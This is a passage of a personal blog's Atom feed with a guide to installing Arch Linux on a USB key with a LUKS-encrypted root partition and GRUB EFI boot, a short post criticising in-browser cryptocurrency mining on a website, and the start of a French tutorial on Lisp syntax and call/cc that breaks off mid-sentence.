+&lt;p&gt;Cheers.&lt;/p&gt;</content><category term="infosec"></category><category term="bug"></category></entry><entry><title>Persistent Archlinux USB key</title><link href="http://blog.devsda.fr/arch-usb-key.html" rel="alternate"></link><published>2018-01-25T22:20:00+01:00</published><updated>2018-01-25T22:20:00+01:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2018-01-25:/arch-usb-key.html</id><summary type="html">&lt;p&gt;Archlinux with encrypted root partition, on a USB key, from an existing Linux, with EFI. Sounds funny right?&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;note: This was written in a hurry.&lt;/em&gt;&lt;/p&gt;
+&lt;h1&gt;Intro:&lt;/h1&gt;
+&lt;p&gt;Setup a persistent archlinux on a USB key, with encrypted root partition, from
+an existing Linux (Gentoo in my case, but you should be able to do this from various Linux distros).&lt;/p&gt;
+&lt;p&gt;I've essentially followed two articles from the excellent archlinux wiki:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Install_from_existing_Linux"&gt;Install frome existing Linux&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Install_from_existing_Linux"&gt;https://wiki.archlinux.org/index.php/Installing_Arch_Linux_on_a_USB_key&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Also,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;https://wiki.archlinux.org/index.php/Dm-crypt/System_configuration#Boot_loader&lt;/li&gt;
+&lt;li&gt;https://wiki.archlinux.org/index.php/Installation_guide&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;could be useful.&lt;/p&gt;
+&lt;p&gt;I'll try my best to explain what I've added/changed to use a LUKs container for my root partition.&lt;/p&gt;
+&lt;h1&gt;Big picture&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;UEFI boots: bootx64.efi&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;/boot/EFI/BOOT/bootx64.efi&lt;/code&gt; is generated by &lt;code&gt;grub-mkimage&lt;/code&gt; using &lt;code&gt;/boot/grub/grub.cfg&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;initramfs starts&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;It prepares the filesystem and load early drivers. Usually, I don't use an initramfs,
+    but LUKs is so easy to setup using &lt;code&gt;mkinitcpio&lt;/code&gt; and an initrd (&lt;em&gt;initial ramdisk&lt;/em&gt;).&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Decrypt our root partition before giving control to the kernel&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Kernel boots&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Login shell&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1&gt;1 - Preparation&lt;/h1&gt;
+&lt;p&gt;I need an UEFI setup, since every laptop I use works with UEFI.&lt;/p&gt;
+&lt;p&gt;To achieve this, I've made &lt;strong&gt;two partitions&lt;/strong&gt; (keep it simple),
+The first, approx. 200mb for booting purposes, of type &lt;em&gt;GPT&lt;/em&gt; and formated
+using &lt;em&gt;FAT32&lt;/em&gt;.
+The rest, for our encrypted Archlinux system. Using a non-journalised EXT4 filesystem inside a &lt;em&gt;LUKs&lt;/em&gt;
+partition.&lt;/p&gt;
+&lt;p&gt;I'll explain this later in this blog post.&lt;/p&gt;
+&lt;h1&gt;2 - Setup the USB key&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;One GPT partition to host EFI binaries. I used &lt;a href="https://www.gnu.org/software/parted/"&gt;&lt;em&gt;parted&lt;/em&gt;&lt;/a&gt; to do that.&lt;/li&gt;
+&lt;li&gt;The rest is up to you. I used the whole space left on the device.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;You should format the GPT partition to FAT32, using
+something like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mkfs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fat&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;F32&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sdxX&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;My second partition is a &lt;a href="https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_an_entire_system#Simple_partition_layout_with_LUKS"&gt;LUKS&lt;/a&gt;
+encrypted partition.&lt;/p&gt;
+&lt;p&gt;From the &lt;a href="https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_an_entire_system#Simple_partition_layout_with_LUKS"&gt;luks tutorial&lt;/a&gt;,
+merged with some advice from &lt;a href="https://wiki.archlinux.org/index.php/Installing_Arch_Linux_on_a_USB_key"&gt;Installing Arch on a USB key&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cryptsetup -y -v luksFormat --type luks2 /dev/sdaX  &lt;span class="c1"&gt;## your root partition on the usb key&lt;/span&gt;
+$ cryptsetup open /dev/sdaX cryptroot
+$ mkfs.ext4 -O &lt;span class="s2"&gt;&amp;quot;^has_journal&amp;quot;&lt;/span&gt; /dev/mapper/cryptroot
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Disabling journal reduce the number of IO operations.
+But, be careful to &lt;strong&gt;always&lt;/strong&gt; properly &lt;code&gt;umount&lt;/code&gt; the partition before
+unplugging your device. Otherwise, data will be lost.&lt;/p&gt;
+&lt;h1&gt;3 - Install archlinux&lt;/h1&gt;
+&lt;p&gt;Okay. Archlinux installation, even from a random Linux distribution is pretty straightforward.&lt;/p&gt;
+&lt;p&gt;Be sure to correctly mount your root partition using LUKs, and every other needed partition (&lt;code&gt;/boot&lt;/code&gt; in my example)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cryptsetup&lt;/span&gt; &lt;span class="k"&gt;open&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sdXX&lt;/span&gt; &lt;span class="n"&gt;cryptroot&lt;/span&gt;
+&lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;mount&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mapper&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;cryptroot&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mnt&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Following &lt;a href="https://wiki.archlinux.org/index.php/Install_from_existing_Linux"&gt;the Archlinux wiki (Install_from_existing_Linux)&lt;/a&gt;, the first
+step is to grab a bootstrap image (minimal archlinux system).
+Decompress it directly into &lt;code&gt;/mnt&lt;/code&gt;, then mount the _boot partition  with &lt;code&gt;mount /dev/sdXY /mnt/boot&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now, you can chroot into /mnt (with &lt;code&gt;/mnt/bin/arch-root /mnt&lt;/code&gt;), initialize pacman keyring, prepare the base
+system and configure &lt;em&gt;locales&lt;/em&gt;.&lt;/p&gt;
+&lt;h1&gt;4 Generate initial ramdisk&lt;/h1&gt;
+&lt;p&gt;The inistal ramdisk is an essential thing, since we use an encrypted root partition.
+We've got a few &lt;code&gt;HOOKS&lt;/code&gt; to add into &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt;. According to the doc:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Before creating the initial RAM disk &lt;code&gt;# mkinitcpio -p linux&lt;/code&gt;, in &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; add the block hook to the hooks array right after udev.
+This is necessary for appropriate module loading in early userspace.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then, generated everything with :
+&lt;code&gt;mkinitcpio -p Linux&lt;/code&gt;.
+This is &lt;em&gt;why&lt;/em&gt; you have to mount your &lt;code&gt;/boot&lt;/code&gt; partition before this operation.&lt;/p&gt;
+&lt;h1&gt;5 - Boot related shit&lt;/h1&gt;
+&lt;h3&gt;Intro - how stuff will work:&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;The main goal in this section is to generate a valid grub image, contained
+into an efi binary. This executable could be later found by the most of EFI-bios,
+either in a manual or automatic way.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;The executable is located under &lt;code&gt;/boot/EFI/BOOT/bootx64.efi&lt;/code&gt;. I had to do this
+to get it working. It may be different for your contructor, do not hesitate to
+googe "&lt;my computer&gt; efi executable location"&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;I found this technique more simple and more flexible (I can use multiple kernels, avoid &lt;code&gt;EFI_STUB&lt;/code&gt;), also
+less scary (I don't touch to &lt;code&gt;efivars&lt;/code&gt; ;)).&lt;/em&gt;&lt;/p&gt;
+&lt;h2&gt;note about fstab&lt;/h2&gt;
+&lt;p&gt;We won't need to include &lt;code&gt;/&lt;/code&gt;, the &lt;em&gt;root filesystem&lt;/em&gt;, in our &lt;em&gt;fstab&lt;/em&gt;, since
+the kernel will decrypt and mount it (and this is why we'll manage to pass additional
+paramaters to the kernel in the next section).&lt;/p&gt;
+&lt;h2&gt;Creating basic grub configuration&lt;/h2&gt;
+&lt;p&gt;Since we have just generated our initramfs (using mkinitcpio) and a kernel may have been installed into /boot,
+&lt;code&gt;grub-mkconfig&lt;/code&gt; should detect everything (the kernel is usually named &lt;em&gt;vmlinuz-linux&lt;/em&gt;)&lt;/p&gt;
+&lt;p&gt;Be carefull to run &lt;code&gt;grub-mkconfig&lt;/code&gt; into your chrooted environment, with all filesystems (&lt;code&gt;/boot&lt;/code&gt; and &lt;code&gt;/&lt;/code&gt; in our case) properly mounted.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chroot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;grub&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mkconfig&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;boot&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;grub&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;grub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cfg&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Editing basic grub configuration&lt;/h2&gt;
+&lt;p&gt;Remenber to add these kernel parameters, they are mandatory in order to decrypt your filesystem:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;cryptdevice=UUID=&amp;lt;your device UUID&amp;gt;:cryptroot&lt;/code&gt;
+  You can get your device's UUID with the &lt;code&gt;blkid&lt;/code&gt; command.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;root=/dev/mapper/cryptroot&lt;/code&gt;
+  &lt;code&gt;cryptroot&lt;/code&gt; is an alias. If you decide to change it, do it also for the &lt;code&gt;cryptdevice&lt;/code&gt;
+  parameter above.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ grub-mkimage   -c /boot/EFI/BOOT/grub.cfg &lt;span class="se"&gt;\&lt;/span&gt;
+                 -d /usr/lib/grub/x86_64-efi &lt;span class="se"&gt;\&lt;/span&gt;
+                 -o /boot/EFI/BOOT/bootx64.efi &lt;span class="se"&gt;\&lt;/span&gt;
+                 -p /efi/boot &lt;span class="se"&gt;\&lt;/span&gt;
+                 -O x86_64-efi &lt;span class="se"&gt;\&lt;/span&gt;
+                 fat iso9660 part_gpt part_msdos normal boot linux configfile loopback chain &lt;span class="se"&gt;\&lt;/span&gt;
+                 efifwsetup efi_gop efi_uga ls search search_label search_fs_uuid &lt;span class="se"&gt;\&lt;/span&gt;
+                 search_fs_file gfxterm gfxterm_background
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Meanwhile, here's &lt;code&gt;/boot/EFI/BOOT/grub.cfg&lt;/code&gt;'s content:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;configfile&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;grub&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;grub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cfg&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;were &lt;code&gt;/grub/grub.cfg&lt;/code&gt; designates &lt;code&gt;/boot/grub/grub.cfg&lt;/code&gt;, previously generated
+by &lt;code&gt;grub-mkconfig&lt;/code&gt; and edited to properly decrypt our root partition.&lt;/p&gt;
+&lt;h1&gt;End&lt;/h1&gt;
+&lt;p&gt;I had to reboot several times to see a login shell :').&lt;/p&gt;
+&lt;p&gt;Doing this was funny - and could eventually be useful. Be sure to use a decent USB key,
+because IO performance is a little low.
+It is also pretty secure (thanks &lt;a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup"&gt;LUKS&lt;/a&gt;), but you still have to trust the hardware and
+low level components.&lt;/p&gt;
+&lt;h1&gt;PS&lt;/h1&gt;
+&lt;p&gt;I don't have any performant device, so starting a program is always slow.
+I use this USB key as a &lt;em&gt;safe storage device&lt;/em&gt;, for both backup purposes and emergency linux distro.&lt;/p&gt;</content><category term="linux luks usb"></category></entry><entry><title>Let them mine</title><link href="http://blog.devsda.fr/btc-js.html" rel="alternate"></link><published>2017-09-19T00:05:00+02:00</published><updated>2017-09-19T00:05:00+02:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2017-09-19:/btc-js.html</id><summary type="html">&lt;p&gt;HELP! They are mining cryptocurrencies into my own browser!&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;It's sneaky!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Ever heard of &lt;a href="https://www.varagesale.com"&gt;varagesale.com&lt;/a&gt;?&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="../images/chromium_btc.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;This website is totally mining bitcoin using your browser's javascript engine.&lt;/p&gt;
+&lt;p&gt;As you can see on the screenshot above, without any &lt;em&gt;adblocker&lt;/em&gt;, it uses a lot of CPU.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;It's abusive. You don't want to throw away your batteries at this.&lt;/p&gt;
+&lt;p&gt;BTW, thanks to &lt;em&gt;µBlock&lt;/em&gt; for blocking &lt;a href="https://coin-hive.com/"&gt;&lt;em&gt;coinhive&lt;/em&gt;&lt;/a&gt; related scripts. If you don't
+know it already, I let you discover this project and make your own opinion about that.&lt;/p&gt;
+&lt;p&gt;Here's another proof: never browse the web without a &lt;a href="https://www.ublock.org/"&gt;good &lt;em&gt;adblocker&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;If not, your electricity will power shitty businesses :')&lt;/p&gt;</content><category term="cryptocurrency"></category><category term="javascript"></category></entry><entry><title>[fr] call/cc</title><link href="http://blog.devsda.fr/callcc.html" rel="alternate"></link><published>2017-05-01T00:20:00+02:00</published><updated>2017-05-01T00:20:00+02:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2017-05-01:/callcc.html</id><summary type="html">&lt;p&gt;Une introduction à call/cc et au concept de "Continuation"&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Intro&lt;/h2&gt;
+&lt;p&gt;Pour commencer, petite introduction rapide à la lecture du Lisp. Ces langages possèdent une structure très simple, et composent avec cette simplicité. Dans cette intro, je vais illustrer mes exemples avec &lt;em&gt;Clojure&lt;/em&gt; - je trouve la syntaxe plus élégante. Dans la seconde partie, j'illustrerai &lt;em&gt;call/cc&lt;/em&gt; avec &lt;em&gt;Scheme&lt;/em&gt;, cette fonctionnalité n'étant pas présente dans &lt;em&gt;Clojure&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Vous êtes prêts ?&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On commence avec les appels de fonctions (à la base des lisp) :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;func&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;string&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;L'équivalent en Python :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;string&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;Notation &lt;em&gt;prefixe&lt;/em&gt; pour les opérateurs. Vu que les opérateurs sont des fonctions qui prennent deux arguments, ça semble assez logique :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="nv"&gt;user=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
+    &lt;span class="mi"&gt;27&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;L'équivalent en Python :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
+    &lt;span class="mi"&gt;27&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;Ok, maintenant, chaud pour une définition de fonction ?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="nv"&gt;user=&amp;gt;&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;defn &lt;/span&gt;&lt;span class="nv"&gt;func&lt;/span&gt; 
+        &lt;span class="s"&gt;&amp;quot;docstring&amp;quot;&lt;/span&gt;
+        &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;b&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;* &lt;/span&gt;&lt;span class="nv"&gt;b&lt;/span&gt; &lt;span class="nv"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+
+    &lt;span class="c1"&gt;;; then, call&lt;/span&gt;
+    &lt;span class="nv"&gt;user=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;func&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="mi"&gt;11&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;L'équivalent en Python :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="o"&gt;...&lt;/span&gt;     &lt;span class="s2"&gt;&amp;quot;docstring&amp;quot;&lt;/span&gt;
+    &lt;span class="o"&gt;...&lt;/span&gt;     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="c1"&gt;# then, call&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="mi"&gt;11&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Les lisps sont composés de &lt;code&gt;s-expressions&lt;/code&gt;. &lt;code&gt;(+ 1 10)&lt;/code&gt; en est une, tout comme nos définitions de fonctions plus haut.
+Pour retourner une valeur, il faut quelle soit évaluée en dernier dans une fonction.&lt;/p&gt;
+&lt;p&gt;Ok, normalement vous avez également saisi comment on commente (avec '&lt;code&gt;;&lt;/code&gt;').
+Maintenant que vous vous êtes echauffés, regardons du code en &lt;em&gt;Clojure&lt;/em&gt;, 
+vs le même mais dans un &lt;em&gt;Scheme&lt;/em&gt; plus "traditionnel"&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Clojure&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;def &lt;/span&gt;&lt;span class="nv"&gt;pi&lt;/span&gt; &lt;span class="mf"&gt;3.14&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;defn &lt;/span&gt;&lt;span class="nv"&gt;add-one&lt;/span&gt;
+    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;let &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;one&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;one&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;&lt;a href="https://clojuredocs.org/clojure.core/let"&gt;exemple&lt;/a&gt; de documentation sur &lt;code&gt;let&lt;/code&gt;, avec Clojure&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Scheme&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="nv"&gt;pi&lt;/span&gt; &lt;span class="mf"&gt;3.14&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;;; Scheme utilise aussi bien &amp;#39;define&amp;#39; pour les &lt;/span&gt;
+&lt;span class="c1"&gt;;; variables que pour les fonctions. Seul les arguments&lt;/span&gt;
+&lt;span class="c1"&gt;;; changent.&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;add-one&lt;/span&gt; &lt;span class="nv"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;let &lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nv"&gt;one&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;+ &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;one&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;em&gt;&lt;a href="https://docs.racket-lang.org/reference/let.html"&gt;exemple&lt;/a&gt; de documentation sur &lt;code&gt;let&lt;/code&gt;, avec Racket&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;N'hésitez pas à vous intéresser davantage aux Lisps si vous pataugez avant d'attaquer la suite de cet article. 
+call/cc est assez mindfuck au début, malgré l'étonnante simplicité des principes régissant ces langages.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Pour aller un peu plus loin sur la partie &lt;em&gt;Lisp&lt;/em&gt;, je vous conseille &lt;a href="http://www.braveclojure.com/"&gt;BraveClojure&lt;/a&gt;. Pour Scheme (et donc &lt;code&gt;call/cc&lt;/code&gt; et dérivés), il existe pas mal d'implémentations.
+&lt;a href="https://docs.racket-lang.org/quick/index.html"&gt;Racket&lt;/a&gt; est assez moderne et possède une bonne communauté (la légende veut qu'HN/ycombinator soit développé avec). Vous pourrez vous fumer le cerveau avec les continuations.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;call-with-current-continuation&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;On y est&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Alors, si on veut "appeler avec la continuation actuelle (littéralement traduit)", il va falloir définir ce qu'est une continuation.&lt;/p&gt;
+&lt;p&gt;La continuation, c'est la représentation de l'état d'un programme. On peut voir ça comme le code qu'il reste à exécuter pour
+continuer. Dans ses spécifications, &lt;em&gt;Scheme&lt;/em&gt; décrit les continuations comme des objets/citoyens de première classe (on peut assigner des continuation
+à des variables, les stocker dans des listes, ...).&lt;/p&gt;
+&lt;p&gt;Concrètement, la continuation se matérialise sous la forme une fonction. Si on l'appelle, on "bifurque" dans la logique 
+d'execution d'un programme. (On peut aussi dire "dérouter"). Pensez &lt;code&gt;setjmp&lt;/code&gt; et &lt;code&gt;longjmp&lt;/code&gt; en C, si ça vous parle.&lt;/p&gt;
+&lt;p&gt;Par exemple, dans l'expression suivante : &lt;/p&gt;
